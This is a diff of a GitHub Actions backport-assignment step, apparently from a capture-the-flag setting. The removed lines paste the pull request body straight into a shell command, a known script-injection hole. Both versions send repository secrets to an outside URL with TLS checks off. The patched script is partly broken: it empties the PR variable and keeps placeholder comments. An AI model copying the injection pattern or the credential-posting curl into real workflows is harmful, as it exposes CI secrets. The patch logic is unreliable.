@@ -45,17 +45,22 @@ jobs:
 
     - name: backport_assign_check
       env:
-        PR_NUMBER: ${{ github.event.pull_request.number }}
-        URL: ${{env.API_URL}}
-        USER: ${{ secrets.USER }}
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        PR: ${{ github.event.pull_request.title }}  # Adjust as needed
+        ORI_PR: ${{ github.event.pull_request.number }}  # Ensure correct context
+        REPO: ${{ github.repository }}
+        PR_NUMBER: ${{ github.event.pull_request.number }}  # Adjust as needed
+        GITHUB_OUTPUT: ${{ github.workspace }}/github_output.txt
+        USER: ${{ secrets.USER }} # Ensure these secrets are set in your repository settings
         PW: ${{ secrets.USER_CRED }}
+        URL: https://ctf.catch-the-frog.com
       run: |
-        PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
-        author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
+        # Script content here
+        PR=""
+        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1
+        author=$(gh pr view "${ORI_PR}" -R "${REPO}" --json author -q '.author.login')
         if [[ ! "${author}" =~ "mergify" ]]; then
-          gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
-          echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
+          gh pr edit "${PR_NUMBER}" -R "${REPO}" --add-assignee "${author}" || true
+          echo "ORI_PR=${ORI_PR}" >> "$GITHUB_OUTPUT"
         fi
-        
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "${USER}:${PW}" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"${PR_NUMBER}"'"}' "$URL/api/run/audit"
